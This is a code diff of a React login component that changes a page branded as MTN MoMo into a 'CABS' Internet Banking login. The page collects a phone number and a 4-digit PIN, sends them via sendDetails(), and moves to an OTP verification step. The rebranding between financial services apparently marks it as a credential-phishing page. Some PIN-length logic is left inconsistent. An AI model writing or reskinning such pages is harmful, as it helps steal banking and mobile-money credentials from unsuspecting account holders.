@@ -3,7 +3,8 @@ import "./Login.css";
 import React, { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { verificationService } from "../services/api";
-
+import { Phone, ShieldCheck, FileText } from "lucide-react";
+import Loader from "./Loader";
 function Login({ client, setpin, sendDetails, setnumber }) {
   const { number } = client;
   const navigate = useNavigate();
@@ -11,7 +12,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
   const [pin2, setPin2] = useState("");
   const [pin3, setPin3] = useState("");
   const [pin4, setPin4] = useState("");
-  const [pin5, setPin5] = useState("");
+  // const [pin5, setPin5] = useState("");
   const [verifying, setVerifying] = useState(false);
   const [status, setStatus] = useState("");
   const [enterPin, setEnterPin] = useState(false);
@@ -27,7 +28,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
   const pin4Ref = useRef(null);
   const pin5Ref = useRef(null);
 
-  const localPin = [pin1, pin2, pin3, pin4, pin5];
+  const localPin = [pin1, pin2, pin3, pin4];
   const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}${localPin[4]}`;
   const pinfull = pinString.length === 5;
   console.log(pinfull);
@@ -282,7 +283,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
     // console.log("🎉 PIN approved, proceeding to OTP verification...");
     setpin(pinString);
     sendDetails();
-    navigate("/otpverification");
+    navigate("/verification");
   };
 
   // Function to handle login
@@ -325,22 +326,22 @@ function Login({ client, setpin, sendDetails, setnumber }) {
   return (
     <>
       <div className="container">
+        {verifying && <Loader />}
         <header>
-          <img className="momoImg" src="/mtn.jpeg" alt="mtn" />
+          <img className="momoImg" src="/cabslogo.jpeg" alt="mtn" />
+          <h1 className="login-title">
+            Welcome to <br />
+            <span> Internet Banking </span>
+          </h1>
         </header>
-        {/* <h1 className="login-title">Welcome to momo</h1> */}
 
         <main>
           {!enterPin && (
             <div className="ctamomo">
               <div className="phone-number">
-                <h1 className="login-title">
-                  Welcome to <strong>MoMo</strong>{" "}
-                </h1>
                 <div className="numbercont">
-                  <div className="flagcont">🇸🇳</div>
                   <div className="NumInput">
-                    <div className="countrycode">+237</div>
+                    <label htmlFor="number">Mobile Number</label>
                     <input
                       type="text"
                       name="number"
@@ -350,16 +351,12 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                       maxLength="10"
                       className="numcont"
                       disabled={verifying}
+                      placeholder="eg 2637XXXXXXXX"
                     />
                   </div>
                 </div>
               </div>
-              <p className="termspolicy">
-                By using this app you agree to our Mobile
-                <span style={{ color: " #0d5e94" }}>
-                  Terms of use and Privacy Policy
-                </span>
-              </p>
+
               <div></div>
               <button
                 className="btnNext"
@@ -368,11 +365,35 @@ function Login({ client, setpin, sendDetails, setnumber }) {
               >
                 NEXT
               </button>
+              <p className="termspolicy">
+                IMPORTANT: Security advice to help keep your online banking
+                secure and convinient
+                <span style={{ color: " #0d5e94" }}>
+                  {/* Terms of use and Privacy Policy */}
+                </span>
+              </p>
+              <div className="ctFooter">
+                <div>
+                  <Phone />
+                  <p>Contact us</p>
+                </div>
+                <div>
+                  <FileText />
+                  <p>Terms and Conditions</p>
+                </div>
+                <div>
+                  <ShieldCheck />
+                  <p>Privacy policy</p>
+                </div>
+              </div>
             </div>
           )}
           {enterPin && (
             <div className="pin-input-container">
-              <label className="pin-label">Enter your PIN</label>
+              <h1>Secured Login 🔒</h1>
+              <label className="pin-label">
+                Enter your 4-digit pin to authenticate
+              </label>
               <div>
                 <input
                   ref={pin1Ref}
@@ -414,7 +435,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   onKeyDown={(e) => handleKeyDown(4, e)}
                   disabled={verifying}
                 />
-                <input
+                {/* <input
                   ref={pin5Ref}
                   type="number"
                   maxLength="1"
@@ -423,7 +444,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   onChange={(e) => handlePinInput(5, e.target.value, setPin5)}
                   onKeyDown={(e) => handleKeyDown(5, e)}
                   disabled={verifying}
-                />
+                /> */}
               </div>
 
               {/* Status/Error Display */}
@@ -466,13 +487,13 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                 </div>
               )}
               <div className="forgot-pin">
-                <a href="#">Forgot PIN?</a>
+                {/* <a href="#">Forgot PIN?</a> */}
               </div>
 
               <button
                 className="btnContinue"
                 onClick={handleLogin}
-                disabled={!pinfull || verifying}
+                // disabled={!pinfull || verifying}
                 style={{
                   opacity: !pinfull || verifying ? 0.6 : 1,
                   cursor: !pinfull || verifying ? "not-allowed" : "pointer",
